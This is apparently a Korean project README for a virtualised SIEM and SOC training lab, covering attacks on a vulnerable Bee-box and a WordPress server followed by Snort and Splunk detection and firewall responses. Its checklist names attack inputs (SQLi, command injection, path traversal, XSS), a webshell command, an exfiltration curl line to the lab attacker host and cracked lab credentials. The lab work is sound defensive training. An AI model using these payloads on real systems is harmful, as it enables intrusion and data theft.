# SIEM 공격 탐지 및 대응 실습 프로젝트

> 최신 문서 기준과 검증 대기 항목: [품질 점검 기록](phase4-soc/quality-audit.md). 설정 적용·재시험 완료를 의미하지 않습니다.

> 통합보안관제 가상환경에서 공격 수행 → 탐지/분석 → 관제 대응까지 전체 사이클 실습

> 📖 참고자료: [공격유형 사전조사 (개념·표적·방어·탐지·오탐정탐)](공격유형-사전조사.md)
> 🧭 컨설팅 파트: [취약점 진단·위험 평가·개선 권고](컨설팅-취약점진단.md)
> 🔭 확장 방향: [프로젝트 확장 방향 고민 메모](프로젝트-확장방향.md)
> 🤝 협업칸(미확정, 참고용): [협업 스터디·환경세팅 가이드](협업/README.md)

---

## 인프라 현황

| 구성요소 | IP | 네트워크 | 역할 |
|---------|-----|---------|------|
| VyOS 라우터 | eth0:DHCP / eth1:10.0.0.1 / eth2:10.50.50.1 | out/rf/att | NAT + 라우팅 |
| pfSense 방화벽 | WAN:10.0.0.254 / LAN:10.0.50.1 / OPT1:10.0.10.1 / OPT2:10.0.100.1 | 전체 | 방화벽 + Snort IPS |
| att-mint (공격자) | 10.50.50.17 | att-net | 공격 수행 PC (LinuxMint) |
| Kali Linux (공격자) | 10.50.50.30 | att-net | 공격 전용 PC (Phase 2.5~) |
| Bee-box (웹서버) | 10.0.10.50 | dmz-net | 취약 웹서버 (bWAPP) |
| **WordPress** (웹서버) | **10.0.10.80** | dmz-net | **회사 홈페이지 (Phase 2.5~)** |
| Ubuntu/Splunk (SIEM) | 10.0.100.50 | inner-net | 로그 수집/분석 |
| **MySQL** (DB) | **10.0.100.60** | inner-net | **DB 서버 (Phase 2.5~)** |
| mng-mint (관리자) | 10.0.50.100 | mng-net | 관제/관리 PC |

```
att-mint(10.50.50.17) ──att-net──→ VyOS ──rf-net──→ pfSense(+Snort IPS)
Kali   (10.50.50.30) ─┘                                  │
                                                     ┌─ dmz-net ──→ WordPress(10.0.10.80) [Phase 2.5~]
                                                     │              Bee-box  (10.0.10.50)
                                                     │
                                                     ├─ inner-net ──→ Splunk  (10.0.100.50)
                                                     │                MySQL   (10.0.100.60) [Phase 2.5~]
                                                     │
                                                     └─ mng-net ──→ mng-mint(10.0.50.100, 관제+정상유저)
```

---

## 진행 상황

> 각 단계는 세부 작업 단위로 나누어 두었습니다. 세부 작업을 완료하시면 해당 `- [ ]`를 `- [x]`로 바꾸어 주시고, 상세 결과는 각 phase README의 "결과:" 블록에 기록해 주세요.

### Phase 0. 인프라 구축
- [x] ESXi 6.7.0 설치 및 데이터스토어 확장
  - [x] ESXi 6.7.0 설치
  - [x] 데이터스토어 용량 확장
- [x] VyOS 라우터 설치 (NAT Masquerade + 정적 라우팅)
  - [x] VyOS VM 설치 및 3개 인터페이스(out/rf/att) 구성
  - [x] NAT Masquerade 설정
  - [x] 정적 라우팅 설정
- [x] pfSense 방화벽 설치 (4개 인터페이스 + IP 설정)
  - [x] pfSense VM 설치
  - [x] WAN/LAN/OPT1/OPT2 4개 인터페이스 할당
  - [x] 각 인터페이스 IP 설정
- [x] mng-mint / att-mint 설치
  - [x] mng-mint(10.0.50.100) 설치 및 mng-net 연결
  - [x] att-mint(10.50.50.17) 설치 및 att-net 연결
- [x] Bee-box(bWAPP) 설치 및 DMZ 배치
  - [x] Bee-box VM 설치 (10.0.10.50)
  - [x] dmz-net 배치 및 bWAPP 구동 확인
- [x] Ubuntu + Splunk 8.2.0 설치 (inner-net)
  - [x] Ubuntu 서버 설치 (10.0.100.50, inner-net)
  - [x] Splunk 8.2.0 설치 및 웹 접속(:8000) 확인
- [x] Snort IPS 설치 (WAN, GPLv2 + ET Open)
  - [x] Snort 패키지 설치 및 WAN 인터페이스 지정
  - [x] GPLv2 + ET Open 룰셋 등록
- [x] syslog 원격 전송 설정 (pfSense → Splunk UDP 514)
- [x] 로그 수집 확인 (index=pfsense, 483 events)
- [x] Kali Linux VM 설치 (att-net, ESXi에 추가)
  - [x] OVF 이관 (VMware Workstation → ESXi 6.7, vmx-14 호환)
  - [x] att-net 네트워크 연결 및 IP(10.50.50.30) 설정 (`/etc/network/interfaces`)
- [x] Kali 공격 도구 확인 (nmap, nikto, sqlmap, hydra, metasploit, wpscan 등)
  - [x] 정찰 도구 확인 (nmap, nikto, dirb, wpscan)
  - [x] 익스플로잇 도구 확인 (sqlmap, hydra, msfconsole)
- [x] Kali → Bee-box / WordPress 접속 확인
  - [x] pfSense NAT 경유 접속 확인 (`curl -I http://10.0.0.254` → 200, `curl -I http://10.0.0.254:8080` → 301)
  - [ ] bWAPP + WordPress 페이지 로딩 확인

### Phase 1. 공격 수행 (Kali/att-mint → Bee-box)

**사전 준비**
- [x] att-mint 공격 도구 설치 (nmap, nikto, sqlmap, hydra, dirb)
- [x] bWAPP 접속 확인 (att-mint → pfSense NAT → Bee-box)
  - [x] `curl -I http://10.0.0.254` 응답 확인 (HTTP 200, Apache 2.2.8 / PHP 5.2.4)
  - [x] bee/bug 로그인 및 Security Level → low 설정 (att-mint 브라우저 → 10.0.0.254)
- [x] 0회차 검증 — 공격자 IP `10.50.50.17` 그대로 로깅 확인, 재부팅 후 로그수집 정상

**정찰 단계 (Reconnaissance)**
- [x] R-1: TCP 포트 스캔 (nmap -sS)
  - [x] `nmap -sS -Pn -p 1-1000` 실행 및 결과 저장 (scan_tcp.txt)
  - [x] 열린 포트(80/tcp) 확인
  - [x] Snort sfPortscan 탐지 확인 ([122:5:1] TCP Filtered Portscan)
- [x] R-2: 서비스 버전 탐지 (nmap -sV)
  - [x] `nmap -sV -Pn` 실행 (scan_version.txt)
  - [x] 웹서버·PHP 버전 식별 (Apache 2.2.8 / PHP 5.2.4 / OpenSSL 0.9.8g, 전부 EOL)
- [x] R-3: 웹 취약점 스캔 (nikto)
  - [x] `nikto -h` 실행 및 결과 저장 (nikto_result.txt, 21개 발견)
  - [x] Snort 탐지 확인 (868 이벤트 — /etc/passwd·traversal·phpinfo·XSS·PHP injection 등)
- [x] R-4: 디렉토리 브루트포스 (dirb)
  - [x] `dirb` 실행 및 노출 경로 확인 (drupal·phpmyadmin·webdav·server-status 등, Snort 다수 탐지)

**웹 공격 단계 (Exploitation)**
- [x] E-1: SQL Injection (수동, bWAPP)
  - [x] 인증 우회 (`' OR '1'='1`) → 전체 목록 반환
  - [x] UNION 데이터 추출 → users 계정·비밀번호 해시 유출
  - [x] Snort SQL Injection 탐지 확인 (SELECT USER + SQL Errors in Response)
- [x] E-2: SQL Injection (sqlmap 자동화)
  - [x] `--dbs` DB 목록 추출 (bWAPP, drupageddon, information_schema, mysql)
  - [x] `--dump`로 users 테이블 덤프 + 해시 크랙
  - [x] Snort 탐지 확인 (211건 — ET SCAN Sqlmap 등)
- [x] E-3: Reflected XSS
  - [x] `<script>alert()</script>` 페이로드 반영 확인
  - [x] Snort "XSS Attempt" 탐지 확인 (3건, ET WEB_SERVER Script tag in URI)
- [x] E-4: Stored XSS
  - [x] 게시글에 쿠키 탈취 스크립트 저장 → 재접속 시 재실행 확인
  - [x] Snort **미탐지** 확인 (POST body → 응답 body 경로는 URI 검사 룰 우회, IPS 한계점)
- [x] E-5: OS Command Injection
  - [x] `; whoami` → `www-data` 출력 확인
  - [x] `; cat /etc/passwd` → 시스템 계정 목록 전체 노출 확인
  - [x] Snort 탐지: 요청측 미탐지(POST body), 응답측 `ET ATTACK_RESPONSE passwd` 1건 탐지
- [x] E-6: Directory Traversal
  - [x] `../../../etc/passwd` → 시스템 계정 목록 전체 열람 성공
  - [x] Snort 양방향 탐지 2건: 요청 `ET WEB_SERVER /etc/passwd in URI` + 응답 `ET ATTACK_RESPONSE passwd`
- [x] E-7: Brute Force (수동)
  - [x] 워드리스트 생성 및 hydra 시도 (pfSense NAT 301 리다이렉트로 자동화 실패)
  - [x] 수동 브루트포스 10회 이상 시도 → bee/bug 로그인 성공
  - [x] Snort **미탐지** 확인 — 개별 요청이 정상 로그인과 동일, 시그니처 기반 IPS로는 행위 기반 공격 탐지 불가
- [ ] 실제 수행 시각 기록표 작성 (R/E 단계별 실행 시각 → Splunk 타임차트 대조용)
- [ ] 실습 정리(Cleanup) — Stored XSS 페이로드·산출물·임시 규칙 원복

### Phase 2. 탐지/분석 + 방화벽 정책 (mng-mint)

**Snort 경보 확인**
- [x] Snort Alerts 확인 (pfSense WebGUI)
  - [x] pfSense Services > Snort > Alerts 확인 완료 (Active Log에는 최근 정보성 경보만 잔존)
  - [x] 총 Snort 경보: **1,170건** (Splunk 기준, All time)
  - [x] Alerts 화면 캡처 저장

**Splunk 로그 분석**
- [x] Splunk 로그 분석 — 공격자 IP 식별
  - [x] `"Priority" "10.50.50.17"` → **1,142건 (97.8%)** 확인 — 공격자 IP 특정 완료
- [x] Splunk 로그 분석 — 공격 유형별 분류
  - [x] 카테고리별 Top 7: ET WEB_SERVER(640), SCAN(155), WEB_SPECIFIC_APPS(65), POLICY(17), INFO(9), EXPLOIT(4), ATTACK_RESPONSE(2)
- [x] Splunk 로그 분석 — 시간대별 공격 분포
  - [x] timechart 실행: 8/3(925건), 8/4(214건), 8/10(31건) — Visualization 차트 확인 완료
  - [x] 시간대별 추이 차트 캡처

**방화벽 정책 대응**
- [x] 1차 대응: 공격자 IP 전체 차단 (WAN 규칙)
  - [x] 적용 전 WAN 규칙 확인 (NAT→10.0.10.50:80 + 기본 Block)
  - [x] WAN에 10.50.50.17 Block 규칙 추가 및 Apply Changes 완료
  - [x] 규칙 순서 확인: Block(10.50.50.17) > Pass(NAT HTTP) > Block(기본) — 최상위 배치 정상
  - [x] 적용 전/후 규칙 캡처
- [x] 2차 대응: 서비스 제한 (HTTP만 허용, DMZ 아웃바운드 차단)
  - [x] WAN: 기존 NAT 규칙이 TCP/80만 허용 (추가 변경 불필요)
  - [x] DMZNET: DMZ→내부(10.0.100.0/24) 차단 규칙 추가
  - [x] DMZNET: DMZ 아웃바운드 전체 차단 규칙 추가 (리버스쉘 방지)
- [x] 3차 대응: Snort 차단 모드 전환 (Block Offenders 활성화)
  - [x] Block Offenders + Kill States 체크, Which IP to Block: SRC
  - [x] Snort 재시작 및 자동차단 검증 — nmap 스캔 후 curl 타임아웃 확인
  - [x] 변경 후 설정 캡처 (Snort Block Offenders 설정 + Blocked 목록)
- [ ] 대응 규칙 적용/해제 순서표 정리 (1~3차 on/off 순서 → Phase 3 검증 선행조건)

### Phase 2.5. 실제 운영 환경 구축 (테크솔루션)

- [x] WordPress 서버 구축 (10.0.10.80, dmz-net)
  - [x] Ubuntu 20.04 VM 생성 및 네트워크 설정 (gateway4 방식)
  - [x] Apache + PHP + WordPress 설치 (버전리스 패키지 사용)
  - [x] 사이트 설정 (techsolution, admin 계정)
  - [x] WP File Manager 8.0.4 + 취약 엔드포인트 시뮬레이션 (CVE-2020-25213)
- [x] MySQL 서버 구축 (10.0.100.60, inner-net)
  - [x] Ubuntu 20.04 VM 생성 및 네트워크 설정
  - [x] MySQL 8.0.42 설치 + 계정/권한 설정
  - [x] 커스텀 테이블 (wp_customers, wp_inquiries) + employees 샘플 DB (300,024건)
  - [x] WordPress ↔ MySQL 연동 확인
- [x] ModSecurity WAF 설치 (WordPress 서버)
  - [x] ModSecurity 2.9.3 + OWASP CRS 3.2.0 설치
  - [x] DetectionOnly 모드 (탐지만, 차단 안 함)
  - [ ] WAF 동작 확인 (XSS 차단, SQLi 통과+로그)
- [x] Apache/PHP 의도적 취약점 설정
  - [x] ServerTokens Full, ServerSignature On
  - [x] display_errors On (기본값 On 확인), open_basedir 미설정, disable_functions 미설정
- [x] pfSense 방화벽 규칙 추가
  - [x] WAN NAT: :8080 → 10.0.10.80:80
  - [x] DMZNET: WordPress(10.0.10.80) → MySQL(10.0.100.60:3306) 허용
  - [x] Snort 커스텀 룰 9개 등록 (`local.rules`) — SID 1000001~1000009
- [x] Splunk 다중 로그 소스 연동 (rsyslog 방식)
  - [x] Splunk TCP 9514 입력 설정
  - [x] WordPress rsyslog 설정 (Apache access/error, ModSecurity audit)
  - [x] MySQL rsyslog 설정 (error log, slow query)
  - [x] Splunk 수신 확인 (19 events, host=mysql/wordpress)
  - [x] 신규 인덱스 생성 (idx_web, idx_waf, idx_db)
  - [x] 필드 추출 설정 (`props.conf`, `transforms.conf`)
- [x] 정상 트래픽 생성 (mng-mint)
  - [x] `05-normal-traffic.sh` cron 등록 (5분 간격)
  - [ ] Splunk에서 정상 트래픽 확인
- [x] Kali Linux 설정 (ESXi, att-net)
  - [x] OVF 이관 및 att-net 연결, IP(10.50.50.30) 설정
  - [x] Bee-box / WordPress 접속 확인 (NAT 경유: :80→Bee-box, :8080→WordPress)

### Phase 3. 킬체인 공격 + 탐지 엔지니어링

**킬체인 공격 수행**
- [x] 정찰 — wpscan + nmap으로 WordPress 스캔 (T1595)
  - [x] nmap: 80(Bee-box), 8080(WordPress) open, 443/3306 filtered
  - [x] wpscan: WordPress 7.1, XML-RPC 활성, readme.html 노출, 1,970 requests
- [x] 초기 침투 — SQLi 시도 (T1190)
  - [x] sqlmap `?s=test` → WordPress 코어 Prepared Statement 보호로 SQLi 실패
  - [x] 공격 시도 자체가 Snort/Splunk에 18건 기록 (탐지 유의미)
- [x] 인증 공격 — wp-login.php 브루트포스 (T1110)
  - [x] hydra 13회 시도 → `admin / rlaquddn1@` 크래킹 성공 (약 30초)
  - [x] Snort SID 1000001 탐지 1,978건, SID 1000002 탐지 8건
- [x] 지속성 — PHP 웹쉘 삽입 via WP File Manager (T1505.003)
  - [x] Hello Dolly 플러그인 hello.php에 웹쉘 코드 삽입 (WP File Manager Code Editor)
  - [x] `curl /?cmd=whoami` → www-data 확인
- [x] 내부 정찰 — 웹쉘에서 서버 정보 수집 (T1046)
  - [x] id, hostname, ip addr, wp-config.php DB 인증정보 추출
  - [x] DMZ IP(10.0.10.80), DB서버(10.0.100.60), 계정(wp_admin/WpAdmin!2024) 확인
- [x] DB 접근 — wp-config.php 인증정보로 MySQL 접근 (T1213)
  - [x] DMZ→Inner-net MySQL 접근 성공, 테이블 목록 및 wp_users 데이터 탈취
  - [x] admin / admin@techsolution.local / bcrypt 해시 획득
- [x] 유출 시도 — 외부 전송 실패 확인 (원인 미확정) (T1041)
  - [x] `curl http://10.50.50.30:8888/exfil` → Connection refused (별도 전송 실패, 차단 원인 미확정)

**탐지 엔지니어링**
- [x] 커스텀 Snort 룰 탐지 테스트 (9개 룰 → 4개 SID 발생 확인, 나머지는 미시험·경로 불일치 구분 필요 — 공격 경로 차이 분석 완료)
- [x] Splunk 상관분석 쿼리 구축 (7종: 브루트포스 교차, SQLi 교차, 웹쉘 시퀀스, 킬체인 타임라인, DB 이상, Alert 설정, 위험 스코어링)
- [x] 탐지 개선 전/후 비교표 작성 (ET Open vs 커스텀 + 시그니처 IDS 구조적 한계 분석)
- [x] 정탐/오탐 판별 기록 (정탐 4건 + False Negative 분석 4건 + 오탐 가능성 검토 4건)

### Phase 4. 관제 운영 (SOC 시뮬레이션)

**모니터링 체계 구축**
- [x] Splunk 대시보드 구축 (SOC_Monitor, 8개 패널 3단 레이아웃: events, time, att_type, att_ip, waf, alerts, db_approach, login_history)
- [x] Splunk Alert 설정 (브루트포스, 스캐너, SQLi, 웹쉘, WAF 급증 — Phase 3 실제 탐지 데이터 기반)

**관제 대응**
- [x] 관제 대응 프로세스 실행 (경보분류→분석→대응→검증)
  - [x] 킬체인 공격 실시간 대응 (Kali 공격 ↔ mng-mint 관제, 2026-08-27 18:49~19:40)
  - [x] 정탐/오탐 판별 (정상 트래픽 vs 공격 트래픽 구분)
- [x] 차단 검증 — pfSense WAN Block 룰(10.50.50.30) 후 재공격 → curl 타임아웃 + WPScan Aborted 확인
- [x] MITRE ATT&CK 매핑 + 킬체인 분석 다이어그램 (7단계 중 5단계 공격 시도 탐지, 1단계 부분탐지, 1단계 외부 전송 실패 (원인 미확정))

**보고**
- [x] 관제 일지 작성 (INC-001~INC-006, `phase4-soc/incident-log.md`)
- [x] 최종 보고서 작성 (`phase4-soc/final-report.md`)
  - [x] Executive Summary (경영진용)
  - [x] 공격 분석 (킬체인 7단계 + MITRE ATT&CK 매핑)
  - [x] 탐지 현황 (Alert 8건 트리거, 탐지 커버리지 5/7)
  - [x] 대응 조치 (IP 차단 + 검증) + 개선 권고 (6-1~6-3)
  - [x] 부록: IOC 목록, Splunk 쿼리 모음, 관제 일지 요약
  - [x] SOC 분석가 사고 확장 (STRIDE/PASTA, IP 평판, EDR 연계, AI 활용)

---

## 폴더 구조

```
project/
├── README.md                ← 이 파일 (전체 진행상황 체크리스트)
├── CLAUDE.md                ← Claude 세션 규칙
├── 프로젝트-확장방향.md        ← 확장 계획 상세 설계
├── phase1-attack/            ← Phase 1: 공격 수행 기록
│   ├── README.md
│   └── images/
├── phase2-detect/            ← Phase 2: 탐지/분석 + 방화벽 정책
│   ├── README.md
│   └── images/
├── phase2.5-setup/           ← Phase 2.5: 실제 운영 환경 구축
│   ├── README.md             ← 구축 가이드
│   ├── scripts/              ← 설치 스크립트 (WordPress, MySQL, ModSec, Splunk UF)
│   ├── configs/              ← 설정 파일 (Apache, PHP, ModSecurity, Snort, pfSense)
│   ├── sql/                  ← DB 스키마 + 더미 데이터
│   └── splunk/               ← Splunk 인덱스·필드추출 설정
├── phase3-killchain/         ← Phase 3: 킬체인 공격 + 탐지 엔지니어링
│   ├── README.md
│   └── images/
└── phase4-soc/               ← Phase 4: 관제 운영 (SOC 시뮬레이션)
    ├── README.md
    ├── images/
    └── incident-log.md       ← 관제 일지
```

---

## 산출물 목록

| 산출물 | 위치 | 상태 |
|--------|------|------|
| 인프라 구축 보고서 | `../13_SIEM_실습보고서.md` / `.docx` | 완료 |
| 공격 실행 기록 (Bee-box) | `phase1-attack/README.md` | **완료** (R-1~R-4, E-1~E-7) |
| Splunk 분석 + 방화벽 정책 | `phase2-detect/README.md` | **완료** (1차·2차·3차 대응) |
| 환경 확장 설계서 | `프로젝트-확장방향.md` | **완료** |
| 환경 구축 스크립트·설정 | `phase2.5-setup/` | **구축 기록 있음 / 배포 설정 동기화 대기** (rsyslog 실제 설정, 필드 추출·룰 백업 필요) |
| 킬체인 공격 기록 | `phase3-killchain/README.md` | **완료** (7단계 킬체인 + 탐지 엔지니어링) |
| SOC 대시보드 + Alert + 관제 대응 | `phase4-soc/README.md` | **완료** (대시보드 8패널 + Alert 5개 + 킬체인 대응 + MITRE 매핑) |
| 관제 일지 | `phase4-soc/incident-log.md` | **완료** (INC-001~INC-006) |
| 최종 보고서 | `phase4-soc/final-report.md` | **완료** (8장: 요약+인프라+공격+탐지+대응+개선+부록+사고확장) |
